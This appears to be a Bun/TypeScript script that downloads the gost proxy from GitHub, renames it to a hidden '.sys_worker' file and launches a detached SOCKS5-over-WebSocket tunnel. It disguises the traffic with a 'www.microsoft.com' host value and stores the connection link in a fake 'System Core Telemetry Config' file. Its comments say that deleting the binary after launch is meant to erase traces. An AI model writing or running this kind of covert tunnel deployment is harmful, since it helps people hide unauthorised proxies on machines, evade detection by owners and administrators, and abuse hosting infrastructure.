import {existsSync, writeFileSync, unlinkSync} from "node:fs";
import {$} from "bun";

// 加载环境变量（Bun 默认会自动加载 .env 文件）
const SERVICE_PORT = process.env.PORT || "6058";
const ROUTE_PATH = process.env.WS_PATH || "/api/v1/stream";
const TARGET_HOST = process.env.HOST || "www.microsoft.com";

// 获取公网 IP
async function getNetNode(): Promise<string> {
    const endpoints = [
        "https://api.ipify.org",
        "https://icanhazip.com",
        "https://ifconfig.me/ip"
    ];
    for (const ep of endpoints) {
        try {
            const res = await fetch(ep, { signal: AbortSignal.timeout(5000) });
            if (res.ok) {
                return (await res.text()).trim();
            }
        } catch {}
    }
    return "127.0.0.1";
}

const NODE_IP = await getNetNode();

async function checkEnvArch(): Promise<[string, string]> {
    const sysName = process.platform;
    if (sysName !== "linux") {
        process.exit(1);
    }
    const arch = process.arch;
    const mapping: Record<string, string> = {
        "x64": "amd64",
        "arm64": "arm64",
        "arm": "armv7"
    };
    return [sysName, mapping[arch] || arch];
}

async function fetchCore(): Promise<string> {
    const repoTarget = "go-gost/gost";
    const releaseApi = `https://api.github.com/repos/${repoTarget}/releases/latest`;
    
    const resp = await fetch(releaseApi, {
        headers: { "User-Agent": "Bun-Engine-Client" }
    });
    if (!resp.ok) throw new Error("Failed to fetch release metadata");
    
    const payload = await resp.json() as any;
    const [, arch] = await checkEnvArch();
    
    let dlUrl = "";
    let assetFilename = "";
    for (const item of payload.assets) {
        const name = item.name.toLowerCase();
        if (name.includes("linux") && name.includes(arch) && (name.endsWith(".tar.gz") || name.endsWith(".tgz"))) {
            assetFilename = item.name;
            dlUrl = item.browser_download_url;
            break;
        }
    }
    if (!dlUrl) process.exit(1);

    const r = await fetch(dlUrl);
    const buffer = await r.arrayBuffer();
    await Bun.write(assetFilename, buffer);
    return assetFilename;
}

async function unpackBinary(archivePath: string): Promise<string> {
    // 使用系统 tar 解压
    await $`tar -xzf ${archivePath}`;
    
    // 查找解压出来的 gost 文件
    const findProc = await $`find . -name "gost" -type f`.text();
    const files = findProc.trim().split("\n").filter(Boolean);
    if (files.length === 0) process.exit(1);

    const gostPath = files[0];
    const targetBin = ".sys_worker";
    
    await $`mv ${gostPath} ${targetBin}`;
    await $`chmod +x ${targetBin}`;
    
    try { unlinkSync(archivePath); } catch {}
    return targetBin;
}

function persistMeta(endpointLink: string) {
    const metaContent = `# System Core Telemetry Config
telemetry:
  node_ip: ${NODE_IP}
  port: ${SERVICE_PORT}
  path: ${ROUTE_PATH}
  host: ${TARGET_HOST}
  endpoint: ${endpointLink}
`;
    writeFileSync(".sys_metric.conf", metaContent, { encoding: "utf-8", mode: 0o600 });
}

async function bootWorker(binPath: string) {
    const endpointLink = `socks5+wss://${NODE_IP}:${SERVICE_PORT}/?path=${ROUTE_PATH}&host=${TARGET_HOST}`;
    persistMeta(endpointLink);

    const cmd = [binPath, "-L", `socks5+wss://:${SERVICE_PORT}/?path=${ROUTE_PATH}&host=${TARGET_HOST}`];

    try {
        // 使用 Bun 后台异步启动，脱离主进程控制
        const proc = Bun.spawn(cmd, {
            stdout: "ignore",
            stderr: "ignore",
            stdin: "ignore",
        });
        proc.unref();

        await Bun.sleep(1000);

        // 启动成功后，立刻销毁本地的二进制文件痕迹
        if (existsSync(binPath)) {
            unlinkSync(binPath);
        }
    } catch {}
}

async function main() {
    let binPath = ".sys_worker";
    if (!existsSync(binPath)) {
        const archive = await fetchCore();
        binPath = await unpackBinary(archive);
    }
    await bootWorker(binPath);
}

main();
